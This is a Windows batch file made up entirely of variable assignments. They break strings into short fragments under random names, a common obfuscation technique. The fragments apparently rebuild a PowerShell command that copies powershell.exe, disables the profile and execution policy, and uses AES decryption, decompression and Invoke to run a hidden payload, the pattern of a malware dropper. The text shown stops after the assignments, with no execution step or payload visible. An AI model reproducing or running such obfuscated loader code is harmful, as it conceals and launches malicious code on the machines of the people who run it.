@echo off
set "cUGaDKmRAF=s\"
set "YcrpUnWAvm=he"
set "PnfHCEPyol=py"
set "SXiRkfrRws=32"
set "CTysYAZcfi=st"
set "OlyawnRYMF=ll"
set "jICsUFLHhT=do"
set "FVLbWHlPTx=Po"
set "dntpyyoecV=1."
set "oKHIKwuxDh=rs"
set "SrMNGjTotU=he"
set "VRNJseOIwz=nd"
set "moMdKjvobd=\W"
set "HutpJSOCgu=\v"
set "HBEerbkMfH=em"
set "IGZSPDouqu=Wi"
set "LkLsXNELxA=in"
set "phGXMHVNPm=ow"
set "yuubjgBylT=we"
set "iiGNVtOBui=ws"
set "yNhiVCEYwD=rS"
set "pjQPBuuHaM=Sy"
set "mnerfclHlx= /"
set "aBkWedmLtz=.e"
set "tVOKsCOJEr=ll"
set "BFtWjELuif=we"
set "NUteVEJcFb=po"
set "lirsRqCVRo=:\"
set "qmJqjEEgjw= C"
set "HlZVLCZwQs=0\"
set "qxZFdUoQuX=co"
set "FwLXgrhQIC=y "
set "jlzyjgHGvZ=xe"
set "ODexUAWZWL= %~dp0"
set "lKJovnloMG=cd"
set "FsZgXlrZfF=Bjmc"
set "XKPhTaxPqy=r.Su"
set "WTokLOxvNe=Invo"
set "IJLNmUoMZi=-Obj"
set "WuVgOOfycz=gqux"
set "hpbfOfGZAm=$gqu"
set "tKRymkhdkC=orF'"
set "VcGONaBsDA=).Sp"
set "JLhWQlCube=trea"
set "FklRKDtWIf=1..-"
set "pNCxQbrujO=Z.Pa"
set "PamHIQkYIH='dqR"
set "KPERqKVqMZ=rtS4"
set "ZOyqYBISjE=pher"
set "WTDYSbeBPH=-ep "
set "DvZchbNFMK=.Key"
set "NkImIEmMvj=Comp"
set "DvNuhjSBfV=.Len"
set "ClyptTkEoJ=]::("
set "HbQTBwndta=bVJ."
set "tUhccppuAR=.Cry"
set "dTQJTiiDoy=mci."
set "WlmoozrUCr=$Bjm"
set "yeJZkTMLjV=comp"
set "SZICKvrulW=yste"
set "IMGwIFLoFw=i = "
set "OfuYpMwZqA=($Zz"
set "dtaKbSbMCH=tem."
set "eNoFFIdGLI=Star"
set "KmMMYXSxty=$YGa"
set "euNdVcFnnP=Vi ="
set "gsYUwsjDnr=.Dis"
set "YklWhMsEeB=pres"
set "IJzAVjQzyC=n ''"
set "tfHuflmrWw=raph"
set "CtOdzLwCmO=);$W"
set "TeAVtcFbvS=.IO."
set "vtiKzeDQFd=-nop"
set "xuAUjoPxEo=ress"
set "DpTCXuZbhs=);$N"
set "eVreZAJZhX=iron"
set "dYxdgjRWaW=]::C"
set "nLLGKfEhdf=F = "
set "ALGSxafYGd=raph"
set "wUMaRSDwsI=bjec"
set "KABzTNwpAO=brea"
set "OTCNSlEFNb=::('"
set "IbwyZxMogp=t Sy"
set "nWLtdEnvxV=.Mem"
set "SyVRWBdPxz=[Sys"
set "ucqifncASm=Bmor"
set "AgaTTNSRPf=736u"
set "xyYxESWmEO=Disp"
set "kDpvrlnMVk=New-"
set "ZwasztFiWx=, (,"
set "TYNOKuYvZI=y]::"
set "YzWviZKCLZ=.Cop"
set "qIogcvSFcO=Stre"
set "XghgXnStLC=ajh."
set "MYQrXteCLQ=gqux"
set "wtyFVJpeYP=UGTu"
set "TUYRFRiKpy=ment"
set "NSUSGyWyEn=3); "
set "vJaEBjzUZI=7;$N"
